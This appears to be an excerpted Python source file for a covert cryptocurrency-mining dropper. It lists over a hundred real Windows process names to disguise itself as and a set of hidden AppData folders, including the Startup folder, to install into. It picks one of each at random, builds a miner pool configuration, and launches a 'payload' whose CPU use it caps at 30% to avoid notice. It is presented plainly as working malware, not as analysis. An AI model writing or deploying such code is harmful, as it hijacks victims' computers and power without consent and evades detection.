...
LEGIT_NAMES = [
    "WmiPrvSE.exe", "RuntimeBroker.exe", "SearchIndexer.exe", "sihost.exe", "taskhostw.exe",
    "ctfmon.exe", "dllhost.exe", "fontdrvhost.exe", "spoolsv.exe", "WinSAT.exe",
    "audiodg.exe", "wlanext.exe", "conhost.exe", "mobsync.exe", "ShellExperienceHost.exe",
    "StartMenuExperienceHost.exe", "SystemSettings.exe", "Taskmgr.exe", "LogonUI.exe",
    "sppsvc.exe", "wlidsvc.exe", "wuauclt.exe", "wermgr.exe", "wsqmcons.exe",
    "unsecapp.exe", "VSSVC.exe", "TrustedInstaller.exe", "TiWorker.exe", "taskeng.exe",
    "SynTPEnh.exe", "svchost.exe", "stacsv64.exe", "spellcheckinghost.exe", "smss.exe",
    "SgrmBroker.exe", "SettingSyncHost.exe", "SecurityHealthService.exe", "SearchProtocolHost.exe",
    "SearchFilterHost.exe", "rundll32.exe", "RuntimeBroker.exe", "RegSvcs.exe",
    "PickerHost.exe", "perfmon.exe", "OpenWith.exe", "OfficeClickToRun.exe",
    "mstsc.exe", "msiexec.exe", "mshta.exe", "mpnotify.exe", "mobsync.exe",
    "LockApp.exe", "LocationNotificationWindows.exe", "lltdsvc.exe", "LdapSvc.exe",
    "InputSwitchToastHandler.exe", "igfxCUIService.exe", "HxTsr.exe", "HxOutlook.exe",
    "HxAccounts.exe", "HelpPane.exe", "HealthAttestationService.exe", "GraphicsPerfSvc.exe",
    "fontdrvhost.exe", "FileHistory.exe", "explorer.exe", "dwm.exe",
    "dpisearch.exe", "DeviceCensus.exe", "dasHost.exe", "CredentialUIBroker.exe",
    "cscript.exe", "CompPkgSrv.exe", "CertEnrollCtrl.exe", "bthudtask.exe",
    "biwinrt.exe", "bcastdvr.exe", "aitagent.exe", "wlrmdr.exe",
    "Winlogon.exe", "WmiApSrv.exe", "Wlclntfy.exe", "wfs.exe",
    "websocketd.exe", "wcncsvc.exe", "walletproxyhost.exe", "w32time.exe",
    "vssadmin.exe", "vds.exe", "usocoreworker.exe", "upnpcont.exe",
    "unregmp2.exe", "TpmInit.exe", "tracerpt.exe", "SystemSettingsThresholdAdminFlows.exe",
    "SpeechModelDownload.exe", "RstMwService.exe", "DWWIN.EXE", "eudcedit.exe",
    "BioIso.exe", "audiotel.exe", "AppVClient.exe", "AnytimeUpgradeResults.exe",
    "agentactivationruntimestarter.exe"
]

INSTALL_DIRS = [
    os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "Caches"),
    os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "WER"),
    os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Windows", "Notifications"),
    os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Windows", "CloudStore"),
    os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "Themes", "CachedFiles"),
    os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Windows", "Shell", "Cache"),
    os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "Recent"),
    os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Windows", "INetCache", "IE"),
    os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "SendTo"),
    os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Windows", "Burn", "Burn"),
    os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
    os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Windows", "Caches"),
    os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "GameExplorer"),
    os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Windows", "History"),
    os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "Libraries"),
    os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Windows", "Roaming", "Tiles"),
    os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "Templates"),
    os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Windows", "Themes"),
    os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "Cookies"),
    os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Windows", "AppCache"),
]
...
def download_and_prepare():
    ...
    try:
        ...
        if src_exe:
            install_dir = random.choice(INSTALL_DIRS)
            ...
            new_name = random.choice(exe_names)
...
def generate_config(config_dir):
    ...
    target_threads = random.randint(min_threads, max_threads)
    hawk.debug(f"[CONFIG] cpu_count={cpu_count}, using {target_threads} threads")
    config = {
        "autosave": True,
        "cpu": {
            "enabled": True,
            "max-threads-hint": target_threads,
            "priority": 1
        },
        "pools": [
            {
...
def monitor_cpu(proc, max_allowed_percent=30, duration_sec=300):
    try:
        import psutil
    except ImportError:
        hawk.error("[CPU_MONITOR] psutil not installed, skipping CPU monitor")
        return
    hawk.info(f"[CPU_MONITOR] watching PID {proc.pid} for {duration_sec}s")
    end = time.time() + duration_sec
    while time.time() < end:
        try:
            p = psutil.Process(proc.pid)
            cpu = p.cpu_percent(interval=10)
            hawk.debug(f"[CPU_MONITOR] current CPU: {cpu:.1f}%")
            if cpu > max_allowed_percent:
                hawk.critical(f"[CPU_MONITOR] CPU {cpu:.1f}% exceeded limit {max_allowed_percent}%")
                proc.terminate()
                trigger_exit(ERR['UNEXPECTED'], f"CPU usage too high: {cpu:.1f}%")
                return
        except psutil.NoSuchProcess:
            hawk.info("[CPU_MONITOR] process already gone")
            break
        except Exception as e:
            hawk.error(f"[CPU_MONITOR] error: {e}")
    hawk.info("[CPU_MONITOR] finished – CPU usage within limits")
...
def run_payload():
    ...
    monitor_cpu(miner, max_allowed_percent=30, duration_sec=300)
